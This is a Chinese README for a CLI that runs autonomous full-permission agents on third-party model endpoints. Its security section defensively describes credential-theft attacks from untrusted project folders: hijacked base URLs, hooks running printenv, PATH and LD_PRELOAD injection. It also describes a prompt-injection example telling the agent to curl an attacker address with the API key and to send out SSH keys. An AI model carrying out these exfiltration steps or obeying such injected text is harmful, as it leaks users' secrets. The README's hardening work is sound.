# agent-fleet — 通用多模型子任务执行工具

给它一个任务描述 + 一个模型,它就用 [Claude Agent SDK](https://github.com/anthropics/claude-agent-sdk-typescript)
驱动一个完整的自主 Agent(能读写文件、跑 bash、多轮工具调用直到任务完成)去执行,权限模式固定
`bypassPermissions`(不需要人工逐步确认每一步),跑完把结果返回。

**核心场景**:你想同时跑好几个任务,每个任务用不同的模型——比如同时起一个用 Gemini 写文案的任务、
一个用 DeepSeek 做调研头脑风暴的任务,两个并行跑,互不干扰,跑完各自把结果交回来。

**本地编排,模型来源你自己选**:Agent 的读写文件、跑命令、多轮工具调用全部在这台机器上进行,不
经过任何托管的编排基础设施。模型请求接的是**你自己的** API key——可以是 DeepSeek、Moonshot/Kimi
官方端点,可以是你自己搭的任何 Anthropic 兼容端点,也可以是 `kollab-gateway`:Kollab 自己的公开
LLM 网关(`POST /api/llm`),用你账号自助生成、随时可吊销的 `kollab_live_*` standalone key 鉴权,
费用从对应 Space 的额度里扣,不需要再单独去 DeepSeek/Moonshot 官网申请 key 就能先跑起来。

## 它是怎么做到"一个工具接多个模型"的

Claude Agent SDK 本质上是"驱动 Claude Code CLI"的 SDK,但 Claude Code CLI 支持把请求整体重定向到
任何**声称自己兼容 Anthropic Messages 协议**的端点(通过 `ANTHROPIC_BASE_URL` + 鉴权环境变量)。
DeepSeek 和 Moonshot(Kimi)都做了这样一层官方兼容端点,所以可以直接用 Claude Agent SDK 的自主
Agent 能力去驱动它们的模型——你拿到的不是"一问一答",而是一个会自己读文件、写代码、跑命令、
多轮纠错直到任务完成的完整 Agent,只是底层模型换成了 DeepSeek/Kimi。

## 支持哪些模型(如实说明,没有编造任何端点)

配置全部在 [`models.config.json`](./models.config.json) 里,已经预填好经过查证的真实官方接入参数:

| 友好名字 | 上游 | 官方接入方式 | 说明 |
|---|---|---|---|
| `deepseek-v4-pro` | DeepSeek | `https://api.deepseek.com/anthropic`,`x-api-key` 鉴权 | 官方 Anthropic 兼容端点,Opus 档位映射目标,适合最高质量单次产出 |
| `deepseek-v4-flash` | DeepSeek | 同上,`model: "deepseek-flash"` | 同一端点的 Flash 档位(官方默认回退模型),快、便宜,适合调研/头脑风暴/大批量任务 |
| `kimi` | Moonshot(Kimi) | `https://api.moonshot.cn/anthropic`,`Authorization: Bearer` 鉴权 | 官方 Anthropic 兼容端点(中国站)。国际站把 `baseURL` 换成 `https://api.moonshot.ai/anthropic` 即可,鉴权方式不变 |
| `gemini` | Google | **没有官方端点** | 见下方说明,需要你自备网关 |
| `kollab-gateway` | Kollab 自己的公开 LLM 网关 | `https://test.flowus.work/api/llm`(TEST 环境),`x-api-key` 鉴权,key 是 `kollab api-key create` 生成的 `kollab_live_*` | 不需要申请任何第三方官方 key,模型范围不限白名单。默认模型是 `gemini-3.8-flash`(**故意不用** `claude-sonnet-4-6`——那样账单虽然走 Kollab 自己的 Space 额度,但底层实际还在消耗 Claude,没有分担成本的效果);已做过真实端到端验证,见下方「验证情况」。费用从这把 key 绑定的 Kollab Space 额度实时扣除,换生产环境用 `https://kollab.im/api/llm` 加一把生产环境生成的 key |
| `kollab-gateway-copy` | 同上 | 同上,`model: "gemini-3.8-flash"` | 文案/创意用途的命名别名,和默认模型相同,单独命名是为了不依赖默认值以后的调整 |
| `kollab-gateway-research` | 同上 | 同上,`model: "grok-4.6"` | 通用调研摘要用途 |
| `kollab-gateway-bulk` | 同上 | 同上,`model: "gemini-3.5-flash-lite"` | 批量翻译/格式转换等机械任务用途,目录里响应最快的免费档模型之一 |
| `kollab-gateway-code` | 同上 | 同上,`model: "glm-5.3-flash"` | 编程任务例外:用户 2026-09-23 定调的例外,GLM 5.3 经两次真实验证(简单请求 + 多轮工具调用编程任务)均未出现裸 tool-call 控制 token 后开放给编程任务使用 |

**关于 Gemini 的如实说明**:查证下来,Google 官方**没有**为 Gemini 提供 Anthropic Messages 协议
兼容端点(不像 DeepSeek/Moonshot 那样)。市面上能找到的都是社区维护的转换代理(比如把 Anthropic
格式转成 Gemini 原生格式或 OpenAI 兼容格式再转发)。所以 `models.config.json` 里 `gemini` 这一项的
`baseURL`/`model` 是**空的**——在你自己搭一个这样的网关(比如自建 [LiteLLM](https://docs.litellm.ai/)
proxy,或任何等价方案)并把地址填进去之前,选这个模型会直接报错退出,**不会**假装有个官方地址静默
发过去。

模型 ID 会随官方迭代变化,建议定期核对:
- DeepSeek: <https://api-docs.deepseek.com/guides/anthropic_api>
- Kimi: <https://platform.kimi.com/docs/api/list-models>

### 任务类型 → 推荐模型(agent-fleet 自己调研 + 真实验证后得出,会持续校准)

下面这张表不是写死的规则,是 agent-fleet 用 `kollab-gateway` 通道跑过一次真实路由调研任务后
给出的建议,加上后来对 `kollab model list`(TEST 环境)返回的完整模型目录做的核对。随着
实际使用积累更多样本、或者 Kollab 网关模型目录变化,这张表应该被重新校准,不要当成一成不变
的硬规则来读。

| 任务类型 | 推荐模型 / 友好名字 | 理由 |
|---|---|---|
| 批量文案 / 创意写作 | `kollab-gateway-copy`(`gemini-3.8-flash`)或 `kollab-gateway`(默认同款) | 速度快、成本低,适合营销文案、社媒文案等对准确性要求不高、追求产量和多样性的写作 |
| 批量翻译 / 格式转换 | `deepseek-v4-flash`(需配 `DEEPSEEK_API_KEY`)或 `kollab-gateway-bulk`(`gemini-3.5-flash-lite`,即用免配置) | 官方 Flash 档更便宜;没有 DeepSeek key 时 `kollab-gateway-bulk` 是免第三方审批的平替 |
| 简单调研摘要 | `kimi`(需配 `MOONSHOT_API_KEY`,自带联网搜索)或 `kollab-gateway-research`(`grok-4.6`,即用免配置) | Kimi 官方端点自带联网检索能力,适合真正需要查资料的调研;不想等 key 审批时用 `kollab-gateway-research` 顶上 |
| 高质量单次产出(长文案定稿、复杂推理) | `deepseek-v4-pro`(需配 `DEEPSEEK_API_KEY`) | DeepSeek 官方 Opus 档位映射目标,适合一次成型、不想反复返工的任务 |
| 编程任务 | `kollab-gateway-code`(`glm-5.3-flash`) | 用户 2026-09-23 指定的编程任务例外,GLM 5.3 已通过两次真实端到端验证(见下方「验证情况」),两次均未出现裸 tool-call 控制 token |
| Kimi/DeepSeek/Qwen 家族、多轮工具调用容错要求高的任务 | 不建议派给这几个家族的第三方模型,留给 Claude 自己处理 | 这几个家族的模型已知存在 tool-calling 可靠性问题,有时会把裸的 tool-call 控制 token 当成普通文本吐出来而不是走结构化 `tool_use`,造成"进程正常退出但其实是假成功"——这是模型生成层面的问题,agent-fleet 的 harness 补不了,只能靠不把这类任务派给它们来规避。**GLM 5.3 是用户 2026-09-23 指定的编程任务例外**(见上一行),即便开了这个例外,只要某次实际输出里出现裸 tool-call 控制 token,那一次仍然要判定失败——不能因为整体开了例外就放松这条判定标准 |

**关于 Qwen**:调研建议里提过可以考虑 Qwen,但截至本次核对(2026-09,TEST 环境
`kollab model list`),Kollab 网关目录里**没有**收录任何 Qwen 系列模型 id,所以上面没有把 Qwen
列进 `kollab-gateway-*` 条目;如果之后网关目录新增了 Qwen,再重新跑一遍 `kollab model list`
确认 `paidOnly` 状态后补充。

**关于裸 tool-call 控制 token**:通过 `kollab-gateway` 系列条目调用第三方模型时,如果返回结果里
出现类似 `<minimax:tool_call>`、`<|tool_calls_section_begin|>` 这类未被正确解析成 `tool_use`
的痕迹,应视为这次调用失败,不能因为 CLI 进程正常退出、`isError: false` 就当成功——这是已知的
模型生成层面缺陷,不是 agent-fleet 的 bug。

## 安装

```bash
cd agent-fleet
npm install
```

**维护约定**：改 CLI 或 SDK 接入时先用 `npm run check-sdk` 检查当前版本；有明确兼容需求才升级依赖，并运行 `npm test` 与相关真实调用。纯文档修改无需升级 SDK 或消耗网关额度。

## 配置

1. 复制密钥模板:
   ```bash
   cp .env.example .env
   ```
2. 打开 `.env`,填入你自己的真实 key(去哪个网站生成见 `.env.example` 里的注释)。
   `.env` 已经被仓库根目录的 `.gitignore` 排除,不会被提交。
3. 如果要加/改/删可用的模型,直接改 `models.config.json`——这个文件本身**不含任何密钥**,
   `apiKeyEnv` 字段只是"去读哪个环境变量",真实值永远只在 `.env` 里。
4. 用 `list-models` 检查配置和密钥状态(只显示 present/missing,绝不打印密钥本身):
   ```bash
   node bin/agent-fleet.mjs list-models
   ```

## 用法

### `run` — 跑单个任务

```bash
agent-fleet run --model <友好名字> --prompt "<任务描述>" [--cwd <目录>] [--json]
```

示例:

```bash
# 用 DeepSeek Flash 做一次调研/头脑风暴
node bin/agent-fleet.mjs run \
  --model deepseek-v4-flash \
  --prompt "帮我调研一下 XX 竞品有哪些定价策略,写一份简短总结"

# 用 Kimi 在指定项目目录里干活,输出结构化 JSON 方便脚本解析
node bin/agent-fleet.mjs run \
  --model kimi \
  --prompt "把这个目录下的 README 翻译成英文,直接改文件" \
  --cwd ~/some-project \
  --json
```

想同时跑多个不同模型的任务,最简单的办法就是开多个终端(或用 `&` 丢后台)各自 `run` 一次——Claude
Agent SDK 的设计就是"一个调用绑一个模型的独立进程",天然支持这样并发,不需要在单进程里做复杂的
多模型切换。

### `run-many` — 一次命令批量并发跑一批任务

```bash
agent-fleet run-many --config batch.json [--json]
```

`batch.json` 是一个数组,每一项 `{ model, prompt, cwd? }`:

```json
[
  { "model": "gemini", "prompt": "写一段产品介绍文案" },
  { "model": "deepseek-v4-flash", "prompt": "调研一下同类产品的定价策略" }
]
```

内部用 `Promise.allSettled` 真正并发执行,每个任务独立成败——一个任务失败不会影响其它任务,最后
把每个任务各自的结果按原始顺序一起返回。

### 常用选项

- `--max-turns <n>`:限制最大工具调用轮数,避免任务跑飞
- `--system-prompt <text>`:追加系统提示
- `--models-config <path>`:临时换一份配置文件(默认用包目录下的 `models.config.json`)
- `--json`:输出结构化 JSON(`ok`、`result`、`numTurns`、`totalCostUsd`、`sessionId` 等字段),方便被
  其他程序/脚本解析

### 自定义请求头(只有自备网关才会用到)

有些第三方网关/企业代理除了 API Key 还要求带一个额外的认证头。这种头的值本身就是凭据,所以规则和
API Key 完全一致:`models.config.json` 里只写**指针**,真实值只放 `.env`。

```jsonc
"my-gateway": {
  "baseURL": "https://gateway.example.com/anthropic",
  "model": "whatever-your-gateway-calls-it",
  "apiKeyEnv": "MY_GATEWAY_API_KEY",
  "headerEnvs": { "X-Gateway-Auth": "MY_GATEWAY_HEADER_TOKEN" }  // 值是变量名,不是真实值
}
```

强制约束(加载配置时就会校验,不合规直接报错退出):

- 不允许写字面量 `headers`——那个文件会进 git。
- `headerEnvs` 的值必须是环境变量名;头值里带换行符会被拒绝(防请求头注入)。
- 不允许自定义 `x-api-key` / `Authorization` 等由 `authHeader` 负责的头。
- `list-models` 只显示头名和 present/missing,**从不打印头值**。

## 验证情况(如实说明)

没有真实的 DeepSeek/Moonshot API key(也没有去别的项目"顺手"拿),所以**这两家官方端点没有做过真实
模型的端到端验证**。`kollab-gateway` 是例外——它用的是 Kollab 产品自助生成的账号 key,不需要等第三方
审批,已经做过一次真实的端到端验证(见第 0 条)。已经做到的:

0. **`kollab-gateway` 系列四个条目全部真实端到端验证(TEST 环境)**:用 `kollab api-key create`
   生成了一把真实的 `kollab_live_*` standalone key(账号自助生成、随时可在 Kollab 里吊销/重建,
   不是 Kollab 内部基础设施或第三方供应商的密钥),写进本地 `.env`(未提交),对 `kollab-gateway`、
   `kollab-gateway-copy`、`kollab-gateway-research`、`kollab-gateway-bulk` 各跑了一次真实调用,例如:
   ```bash
   node bin/agent-fleet.mjs run --model kollab-gateway --prompt "回复OK两个字,不要调用任何工具" --json
   ```
   四次调用全部返回 `"ok": true`、`"result": "OK"`、`"isError": false`,分别解析到
   `resolvedModel: gemini-3.8-flash`(x2,`kollab-gateway` 和 `kollab-gateway-copy`)、
   `grok-4.6`(`kollab-gateway-research`)、`gemini-3.5-flash-lite`(`kollab-gateway-bulk`),
   都带真实的 `totalCostUsd`(从该 key 绑定的 Space 额度扣除)和 `sessionId`,确认请求真的经过
   `POST https://test.flowus.work/api/llm` 拿到了对应模型的真实响应,不是报错也不是 mock,返回内容
   里也没有出现裸的 tool-call 控制 token。

   **`kollab-gateway-code`(GLM 5.3,2026-09-23 追加验证)**:用户要求给编程任务开例外前,先跑了
   两次真实验证而不是只改配置。第一次是简单无工具调用请求(`--prompt "回复OK两个字,不要调用任何
   工具"`),返回 `"ok": true`、`"result": "OK"`,`numTurns: 1`,`totalCostUsd: 0.09276`。第二次是
   真实的多轮工具调用编程任务(在临时目录里让它写 `add.js` 导出加法函数,再写一个跑
   `add(2,3)===5` 断言的脚本),`numTurns: 3`,`totalCostUsd: 0.1361`,人工 `cat` 检查了生成的
   `add.js`/`test.js` 内容合理,并且亲自用 `node test.js` 实跑一遍确认真的打印 `PASS`、退出码 0——
   不是只看 agent-fleet 自报的 `"ok": true`。两次调用的完整输出都人工过了一遍,均未出现任何裸露的
   tool-call 控制 token(如 `<tool_call>`、`<minimax:tool_call>`、`<|tool_calls_section_begin|>`
   等)。**注意范围**:这只验证了 `glm-5.3-flash` 这一个模型,不代表 Kimi/DeepSeek/Qwen 家族的
   同类风险已被排除,那几个家族仍按原结论处理。

1. **代码能正常跑**:`--help`、`--version`、`list-models`、缺参数/缺密钥/未知模型等错误路径都手动
   跑过,报错信息清晰可操作。
2. **本地假上游端到端验证**(`test/smoke-test.mjs`,`npm run smoke-test`):自己起了一个模拟 Anthropic
   Messages 流式协议的本地 HTTP 服务器(`test/mock-anthropic-server.mjs`),配一个指向它的假模型,
   真跑一次完整的 `run` 和 `run-many`,断言:
   - CLI 真的把请求发到了配置里指定的 `baseURL`,而不是官方 Anthropic 端点
   - `x-api-key` 和 `Authorization: Bearer` 两种鉴权风格都按配置正确生效
   - `bypassPermissions` 权限模式下,SDK 真的跑完了一整个 `query()` 循环并产出最终 `result`
   - `run-many` 里两个不同模型的任务确实并发跑完,各自拿到正确的结果

   这条验证**不需要任何真实密钥**,`npm run smoke-test` 随时可以重跑。

3. **安全回归测试**(`test/security-unit-test.mjs` + `test/security-e2e-test.mjs`,
   `npm run security-test`):专门守下面「安全边界」一节那几条不变量。端到端那一半会同时起**两个**
   本地假上游——一个扮演"你配置的正经上游",一个扮演"攻击者地址",然后按"攻击者那边到底收没收到
   密钥"来判定,而不是断言代码里有没有某一行。覆盖:宿主凭据泄露场景、目标目录劫持 `baseURL`、
   目标目录注入自定义头、恶意配置藏在祖先目录、绕过前置闸门时结构性兜底是否还在,外加两条
   正向用例(正常项目目录不被误拦、合法自定义头仍然能用)。同样**不需要任何真实密钥**。

   跑全部验证:`npm test`。

4. **联调和复核过程中发现并修复了三个真实的安全问题**,详见下面「安全边界」一节。

## 接下来你需要做的事

0. 想先跑起来、不想等第三方 key 审批:直接用 `kollab-gateway` 系列——`kollab api-key create --name <你的名字>`
   生成一把 `kollab_live_*` key,填进 `.env` 的 `KOLLAB_LIVE_API_KEY`,四个条目(`kollab-gateway`、
   `kollab-gateway-copy`、`kollab-gateway-research`、`kollab-gateway-bulk`)都已经验证过真实可用
   (见上一节第 0 条),按「任务类型 → 推荐模型」表按用途直接选对应条目名即可。
1. 去 DeepSeek(<https://platform.deepseek.com>)和/或 Moonshot(<https://platform.moonshot.cn>)
   生成真实 API key,填进 `.env`。
2. 如果要用 Gemini,自己搭一个 Anthropic 兼容网关,把地址和它认的模型 ID 填进
   `models.config.json` 的 `gemini` 条目。
3. 手动跑一次真实调用确认端到端可用,比如:
   ```bash
   node bin/agent-fleet.mjs run --model deepseek-v4-flash --prompt "说一句你好" --json
   ```
4. 需要的话把 `bin/agent-fleet.mjs` 链接到 `PATH` 里(比如 `npm link`),这样就能直接敲
   `agent-fleet run ...`,不用带 `node bin/agent-fleet.mjs` 前缀。

## 安全边界

### 谁说了算:信任模型

这个工具的核心信任规则只有一条:

> **「请求发去哪个地址、带什么凭据、带什么额外请求头」的唯一真相源,是你自己的
> `models.config.json` + `.env`。其它任何来源都无权改动这三件事,也无权让这台机器在
> 带着这些凭据的环境里自动执行命令。**

"其它任何来源"具体指两类,都已经出过真实漏洞:

| 不可信来源 | 它曾经能干什么 | 现在怎么挡的 |
|---|---|---|
| **继承来的宿主环境变量**(你在另一个 Claude Code 会话里嵌套跑这个工具时) | 宿主的 OAuth 登录态、宿主配的 `ANTHROPIC_CUSTOM_HEADERS`(可能是企业代理口令)会跟着请求发给你配的第三方地址 | `src/isolated-env.mjs`:每次调用前整族剥离 `ANTHROPIC_*` / `CLAUDE_*` 环境变量,再只叠回本次任务要用的那几个 |
| **`--cwd` 指向的目标工作目录**(可能是别人发给你的项目文件夹) | 目录里自带一份 `.claude/settings.json`,用 `env.ANTHROPIC_BASE_URL` 就能把请求整个劫持到攻击者地址,**你配置在 `.env` 里的真实第三方 key 被原样送过去**;`hooks` 字段则能在会话启动时无条件执行任意命令,一条 `printenv` 就把密钥读走 | 两层:`src/project-trust.mjs` 前置闸门直接拒绝运行 + `src/run-task.mjs` 把路由钉在优先级最高的 flag 层配置里 |

第二条尤其要注意:它**不需要**"嵌套在另一个 Claude Code 会话里"这个前提,只要你拿这个工具去处理一个
别人给的目录就会触发,所以危害比第一条更高。而且它**不需要模型配合**——`hooks` 那条是无条件执行的,
不像 prompt injection 还要看模型上不上钩。

### 目标工作目录能做什么、不能做什么

`--cwd` 指向的目录仍然可以带自己的 `CLAUDE.md`、`permissions`、`outputStyle` 等**描述性的本地行为**
配置——那是这个工具的正常用法,决定 Agent 在这个目录里怎么干活。

它**不能**做的事(命中任何一条,整次运行直接报错退出,连密钥都不会被读进内存):

- **设置任何环境变量**。`env` 块里一个变量都不许有。这条一开始是按黑名单做的(挡 `ANTHROPIC_*`、
  代理、TLS 信任根等),但独立复核实测打通了一条黑名单没覆盖的路子:在 `env.PATH` 最前面插一个
  目录、放一个假的 `git`,Agent 干活时几乎必然会执行到它,密钥当场被读走,**不需要 prompt
  injection**。同类变量(`BASH_ENV`、`LD_PRELOAD`、`DYLD_*`、`PYTHONPATH`、`GIT_SSH_COMMAND`…)
  根本枚举不完,所以改成全禁——目标目录该描述的是"在这个目录里干什么活",不是"这个进程怎么跑"
- 使用 `apiKeyHelper` / `awsAuthRefresh` / `awsCredentialExport` / `gcpAuthRefresh` /
  `otelHeadersHelper` / `proxyAuthHelper` / `forceLoginMethod` / `policyHelper` 这类
  "由我来决定凭据从哪来"的顶层字段(这组就是 SDK 自己归类的 credential helpers)
- 使用 `hooks` / `statusLine` / 插件装载(`enabledPlugins` 等)——这些字段的值是**会被自动执行的
  命令**,而子进程环境里带着你的真实密钥。实测确认:一份带 `SessionStart` hook 的项目配置,
  `printenv ANTHROPIC_API_KEY` 就能把密钥写出来,全程不需要模型配合

另外目标目录里的 `.mcp.json` 不再被自动加载(`strictMcpConfig`)——MCP server 条目同样是"会话启动时
自动执行的命令"。

选择"直接拒绝"而不是"忽略该字段继续跑":一个正经项目没有任何理由去重定向别人工具的模型流量,出现
这种字段本身就是强信号,静默忽略等于把攻击尝试藏起来。报错信息会告诉你是哪个文件的哪个字段。

代价要说清楚:**目标目录里的项目 hooks 和 `env` 块从此不会生效**。如果你自己的项目在
`.claude/settings.json` 里写了 `hooks` 或 `env`(哪怕只是 `NODE_ENV=test` 这种无害的),用这个工具
处理该目录时会直接报错退出。这是有意的取舍——在"目录可能来自外部"这个前提下,能执行命令、能改
进程环境的字段没法安全放行。删掉那个字段,或者换一个工作目录。

### 不会污染你正在用的 Claude Code

agent-fleet 会把 `CLAUDE_CONFIG_DIR` 指向自己专属的 `~/.agent-fleet/claude-config/`,所以它跑出来的
会话记录不会混进你真实 Claude Code 的 `~/.claude/`(已实测:跑一次任务,`~/.claude/` 下没有新增任何
由它产生的文件)。同时它也不加载你的全局 `~/.claude/settings.json` 和目标目录的 `.mcp.json`。

另外它会关掉 Claude Code CLI 默认的遥测、错误上报、自动更新检查和 GrowthBook 远程 feature-flag
拉取(`DISABLE_TELEMETRY`/`DISABLE_UPDATES`/`DISABLE_GROWTHBOOK`/`DO_NOT_TRACK` 等一整组开关,
逐个对照已安装 SDK 的原生二进制核实过是真实生效的变量名,不是抄文档臆测),目标是除了发给你
配置的那个模型端点之外不产生其它对外流量。

**这一条已经做过网络层面的验证,不是只停留在"设了开关"**:跑一次真实任务(`agent-fleet run`),
在执行期间用本机代理内核(Clash/mihomo 一类工具的 external-controller API)记录的 SNI 连接日志,
按 OS 级别的进程路径精确反查这个 SDK 原生二进制发起的每一次连接——结果是整个任务执行期间它只
建立了一次对外连接,目的地就是 `models.config.json` 里配的第三方 baseURL,没有任何流量打到
`*.anthropic.com`、`*.sentry.io`、`cdn.growthbook.io` 这些 Anthropic 或其遥测供应商控制的域名。
也就是说:只要你在 `models.config.json` 里配的是非 Claude 端点,Anthropic 的服务器不会看到这次
调用的存在,自然也就无从"知道"你在切换或使用其它模型。

**注意**:工具跑的是 `bypassPermissions` 全权限 Agent,它对你主目录下的文件**没有**任何自动防护。
如果任务描述含糊、或者你把 `--cwd` 指向主目录,它是有可能去读甚至改 `~/.claude/` 这类敏感目录的。
边界得由你自己把住:把 `--cwd` 指向那个具体项目目录,别指向 `~`。

### 其它既有约束

- 代码、配置模板、这份 README 里都没有写过任何真实 API key。
- `.env` 已被仓库 `.gitignore` 排除。
- `models.config.json` 本身允许提交进 git——它不含密钥,`apiKeyEnv` / `headerEnvs` 都只是变量名指针;
  如果有人不小心往里面直接写字面量 `apiKey` 或 `headers`,`src/config.mjs` 加载时会直接拒绝并报错。
- `list-models` 只显示密钥和自定义头的状态(present/missing),从不打印它们的值。
- 只加载目标目录自己的项目配置,不加载操作者本机的全局 `~/.claude/settings.json`。

### 还没解决的风险(不要误读上面这些防护的强度)

**这个工具目前仍然不适合用来处理你完全不信任的目录。** 上面修的是"零交互、纯配置驱动"的静默劫持:
攻击者不需要你做任何事,把工具指过去密钥就没了。这类路径已经堵上。

但 agent-fleet 跑的是 `bypassPermissions` 的自主 Agent——它会读目录里的文件、执行 bash,而且
**不需要人工确认每一步**。所以一个恶意目录仍然可以:

- 在 `CLAUDE.md` 或任何会被读到的文件里写 prompt injection,诱导模型自己执行
  `curl 攻击者地址 -d "$ANTHROPIC_API_KEY"`;
- 诱导模型读取并外发这台机器上的其它文件(SSH 私钥、其它项目的 `.env` 等)。

另外要诚实说明:上面那张"不能做什么"的清单是**黑名单**,不是完备的白名单。Claude Code 后续版本新增
的字段如果也能执行命令或影响出口,需要有人把它补进 `src/project-trust.mjs`。开发过程中就已经出现过
一次这种情况——最初只盯着 `env` 块和凭据类字段,`hooks` 是后来实测才发现同样能直接读走密钥的。

这是 `bypassPermissions` 这个设计选择的固有代价,不是配置层能解决的问题。实务建议:

- 处理来路不明的目录时,**先把它当成不可信代码看待**,或者干脆别用这个工具;
- 真要跑,放进容器/一次性虚拟机里跑,别在装着你全部凭据的主力机器上跑;
- `.env` 里只放这个工具真正需要的第三方 key,别把它和别的凭据堆在同一个 shell 环境里。
